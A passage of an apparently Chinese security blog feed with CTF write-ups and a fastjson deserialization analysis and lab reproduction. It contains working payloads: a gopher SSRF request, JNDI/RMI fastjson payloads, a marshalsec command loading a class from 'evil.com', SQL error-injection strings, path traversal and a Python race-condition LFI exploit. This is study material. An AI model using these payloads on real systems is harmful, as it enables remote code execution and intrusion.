class="line">http:&#x2F;&#x2F;172.35.16.17&#x2F;ssrf.php?way&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_%250APOST%2520&#x2F;admin.php%2520HTTP&#x2F;1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250AContent-Length%253A%252056%250A%250Ausername%253Dadmin%2526password%253D5fb4e07de914cfc82afb44vbaf402203%250A</span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%202.png"></p><p>把cookie保存下来，然后改之后访问flag.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%203.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN华南赛区分区赛wp&quot;&gt;&lt;a href=&quot;#CISCN华南赛区分区赛wp&quot; class=&quot;headerlink&quot; title=&quot;CISCN华南赛区分区赛wp&quot;&gt;&lt;/a&gt;CISCN华南赛区分区赛wp&lt;/h1&gt;&lt;p&gt;期末考终于结束了，抓紧来整理一下这次比赛的w</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化漏洞分析与复现</title>
    <link href="http://www.fxizenta.design/2021/05/29/fastjson/"/>
    <id>http://www.fxizenta.design/2021/05/29/fastjson/</id>
    <published>2021-05-29T13:21:06.000Z</published>
    <updated>2021-08-13T15:35:56.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h1><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。Fastjson应用范围非常广，在github上star数超过22k。2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。2020年6月1日 fastjson爆发新的反序列化远程代码执行漏洞，fastjson 1.2.68及以前版本存在黑客利用漏洞，可绕过autoType限制，直接远程执行任意命令攻击服务器，风险极大。本文简要介绍Fastjson反序列化漏洞利用原理并复现被利用过程，以使得技术人员在工作中对Fastjson反序列化漏洞有更进一步的认识，提高重视程度。</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p><ul><li>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</li><li>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</li></ul><p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p><ul><li>parse (String text)</li><li>parseObject(String text)</li><li>parseObject(String text, Class clazz)</li></ul><p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String cmd;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Poc() is called&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;getCmd() is called&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> cmd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;setCmd() is called&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPoc</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String Poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;poc.test.Poc\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">JSONObject b = JSON.parseObject(Poc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Poc() is called</span><br><span class="line">setCmd() is called</span><br><span class="line">getCmd() is called</span><br></pre></td></tr></table></figure><p>Fastjson允许用户在输入JSON串时通过<strong>“@type”键对应的value指定任意反序列化类名</strong>，为了让服务端按照指定类型反序列化，所以这里再引入一个@type。通过type指定了反序列化的类型，在给parseObject传参时，@type指定了当前字符串按照Poc类来解析。在Poc类中写了一个无参构造方法、getter和setter方法。根据结果显示，在反序列化时同时调用了无参构造函数以及getter和setter方法，setter方法中中通过exec执行了外部命令计算器。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于 <strong><code>fastjson版本 &lt;= 1.2.24</code></strong>的情况，利用思路主要有2种</p><ul><li>通过触发点<strong><code>JSON.parseObject()</code></strong>这个函数，将<strong><code>json</code></strong>中的类设置成<strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></strong>并通过特意构造达到命令执行</li><li>通过<strong><code>JNDI注入</code></strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo;</span><br><span class="line"></span><br><span class="line">~~~~<span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        poc t = <span class="keyword">new</span> poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>≤1.2.24</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>:&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"><span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;x1001&quot;</span>:&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/Exploit&quot;</span>,</span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JDNI(≤1.2.47)</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="将com-sun-rowset-JdbcRowSetImpl存入-mappings-中"><a href="#将com-sun-rowset-JdbcRowSetImpl存入-mappings-中" class="headerlink" title="将com.sun.rowset.JdbcRowSetImpl存入 mappings 中"></a>将com.sun.rowset.JdbcRowSetImpl存入 mappings 中</h3><p><code>DefaultJSONParser</code>→<code>checkAutoType</code>-&gt;<code>getClassFromMapping（为null）</code>-&gt; <code>deserializers.findClass(typeName)</code>,所以返回<code>java.lang.class</code>→通过 <code>config.getDeserializer</code> 获得反序列化的路由类 <code>MiscCodec</code>-&gt;调用该路由类的<code>deserialze(this, clazz, fieldName)</code>方法→</p><p><code>parser.parse()</code>提取<code>com.sun.rowset.JdbcRowSetImpl</code>赋值给<code>objVal</code></p><p>→<code>TypeUtils.loadClass</code>-&gt;loadClass的重载方法将<code>com.sun.rowset.JdbcRowSetImpl</code>存入checkAutoType的mappings中</p><h3 id="绕过并执行实现RCE"><a href="#绕过并执行实现RCE" class="headerlink" title="绕过并执行实现RCE"></a>绕过并执行实现RCE</h3><p>前面一样不过传入的typename是com.sun.rowset.JdbcRowSetImpl→<code>checkAutoType</code>-&gt;由于第一次解析中将<code>com.sun.rowset.JdbcRowSetImpl</code>存入 <code>mappings</code> 中通过<code>TypeUtils.getClassFromMapping(typeName)</code>;获取到 <code>com.sun.rowset.JdbcRowSetImpl</code> 对象然后返回该对象（完成绕过)→调用<code>deserializer.deserialze(this, clazz, fieldName)</code>，不同的是这次得到的反序列化路由类为<code>FastjsonASMDeserializer</code>。→<code>deserialze</code>方法→在<code>setValue</code>中通过<code>method.invoke(object, value)</code>反射执行<code>com.sun.rowset.JdbcRowSetImpl.setAutoCommit</code>方法</p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>跟进<code>setAutoCommit</code>中的<code>this.connect()</code>方法</p><p><code>this.connect</code>对成员变量<code>dataSourceName</code>进行<code>lookup</code>，成功利用jndi注入</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exec:<span class="number">620</span>,Runtime <span class="comment">//命令执行Lookup:417,InitalContext  </span></span><br><span class="line"><span class="comment">//jndi </span></span><br><span class="line">lookup函数通过rmi加载恶意类setAutoCommit:<span class="number">4067</span>,JdbcRowSetImpl <span class="comment">//通过setAutoCommit触发lookup函数setValue:96,</span></span><br><span class="line">FieldDeserializer <span class="comment">//反射调用传入类的set函数deserialze:600, </span></span><br><span class="line">JavaBeanDeserializer <span class="comment">//通过循环调用传入类 </span></span><br><span class="line">set,get,is函数parseObject:<span class="number">368</span>,DefaultJSONParser <span class="comment">//解析传入的json字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>文章内环境配置完全省略，请自行寻找环境配置教程</p><p>复现针对1.2.47的反序列化漏洞，采用JDNI注入的方式</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>docker</li><li>docker-compose</li><li>vulhub</li><li>win10</li><li>Ubuntu18.04 VPS</li><li>java1.8</li><li>python3.7</li><li>marshalsec</li><li>burpsuite</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>主要是用python3起的http目录服务和marshalsec起的rmi服务，靶机则是用的vulhub+docker-compose</p><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><p>使用vulhub的docker文件</p><p>目录为vulhub/fastjson/1.2.47-rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>docker和docker-compose以及相关使用请自行学习</p><h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>首先准备一个java恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure><p>然后在恶意类的目录下用python起一个http服务（注意这里使用的python是3.7，python2语法不同请自行百度）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 33333//端口看你个人喜欢</span><br></pre></td></tr></table></figure><h3 id="准备RMI服务器"><a href="#准备RMI服务器" class="headerlink" title="准备RMI服务器"></a>准备RMI服务器</h3><p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>借助marshalsec项目，启动一个RMI项目，然后编译项目，然后在target下运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://evil.com/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure><p>成功启动RMI服务</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson1.png" alt=""></p><h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器号 bash //进入容器</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson2.png" alt=""></p><p>有seccess，漏洞利用成功</p><p>exit退出容器 down掉docker，复现结束</p>]]></content>
    
    
    <summary type="html">对于fastjson反序列化漏洞的分析和对于最新的1.2.47版本的JNDI注入绕过的复现</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="fastjson" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson/"/>
    
    
    <category term="反序列化" scheme="http://www.fxizenta.design/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="RCE" scheme="http://www.fxizenta.design/tags/RCE/"/>
    
    <category term="JNDI注入" scheme="http://www.fxizenta.design/tags/JNDI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn_web_wp</title>
    <link href="http://www.fxizenta.design/2021/05/18/ciscn2021/"/>
    <id>http://www.fxizenta.design/2021/05/18/ciscn2021/</id>
    <published>2021-05-18T01:07:07.000Z</published>
    <updated>2021-07-23T09:05:40.368Z</updated>
    
    <content type="html"><![CDATA[<p>先放上比赛时解出的题，剩下的题目等wp之后再慢慢复现吧</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>报错注入</p><p>information_schema sys 全被过滤</p><p>参考<a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql 注入 information<em>schema</em>绕过IDS过滤information<em>schema继续注入</em>宇文数学的博客-CSDN博客</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;)and(select extractvalue(1,concat(0x7e,(select * from users where id&#x3D;1 and Polygon(id)))))%23</span><br></pre></td></tr></table></figure><p>出security<code>.</code>users<code>.</code>id 知道库名，一个表名和一个列</p><p>之后爆user除了id以为的列名，然后看user表发现没有有用的东西</p><p>盲猜应该是在其他表里，随便试了个flag，发现真的有这个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select * from(select * from flag a join flag b)c))))</span><br></pre></td></tr></table></figure><p>然后就是加上using测其他</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select * from(select * from flag a join flag b using(id))c))))</span><br></pre></td></tr></table></figure><p>测出flag有<code>625b4d5d-a34a-4843-8e09-70e91ef003a9</code>字段，一看就很不正常，读一下发现是flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select extractvalue(1,concat(0x7e,(select group_concat(&#96;625b4d5d-a34a-4843-8e09-70e91ef003a9&#96;) from flag))))</span><br></pre></td></tr></table></figure><p>发现显示不全</p><p>用right看没显示全的部分</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085929.png" alt=""></p><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题</p><p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>payload：?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085810.png" alt=""></p><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>看../../../../../../../../etc/apache2/envvars发现有个PHP_SESSION_UPLOAD_PROGRESS</p><p>扫目录发现有个.listing</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210518085737.png" alt=""></p><p>访问/.listing 发现有个you_can_seeeeeeee_me.php，访问发现是个phpinfo()</p><p>基本确认是PHP_SESSION_UPLOAD_PROGRESS的本地包含</p><p>然后参考<a href="https://blog.csdn.net/mochu7777777/article/details/116499336的脚本加上条件竞争">https://blog.csdn.net/mochu7777777/article/details/116499336的脚本加上条件竞争</a></p><p>sess的目录可以在phpinfo中找到是/var/lib/php/sessions/dhbiedjbgc/</p><p>然后就是从/etc/开始找起找一下奇怪字符串组成的目录，第一个目录比较难找其他就目录下就一个文件夹，一直找下去直到发现fl444444g</p><p>最后读一下/etc/dbeicagidd/eeaefabfif/bfcaciaahd/cbbfaadhee/efbibeigci/fl444444g</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://124.71.225.249:23817/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;abcd&#x27;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php $c = scandir(&quot;/etc/dbeicagidd/eeaefabfif/bfcaciaahd/cbbfaadhee/efbibeigci/fl444444g&quot;);var_dump($c);?&gt;&#x27;</span>,<span class="string">&quot;field&quot;</span>:<span class="string">&quot;abcababab&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../../../../../../var/lib/php/sessions/dhbiedjbgc/sess_&quot;</span>+sessid&#125;</span><br><span class="line">myfile=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;abcd.txt&#x27;</span>,f)&#125;</span><br><span class="line">mycookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url, data=mydata, files=myfile, cookies=mycookie )</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(res.text) != <span class="number">2037</span>):</span><br><span class="line">            print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先放上比赛时解出的题，剩下的题目等wp之后再慢慢复现吧&lt;/p&gt;
&lt;h2 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_sql&quot;&gt;&lt;/a&gt;easy_sql&lt;/h2&gt;&lt;p&gt;报错注入&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>同源策略和COTRS</title>
    <link href="http://www.fxizenta.design/2021/05/06/same_source_and_cors/"/>
    <id>http://www.fxizenta.design/2021/05/06/same_source_and_cors/</id>
    <published>2021-05-06T12:07:07.000Z</published>
    <updated>2021-07-23T09:09:15.632Z</updated>
    
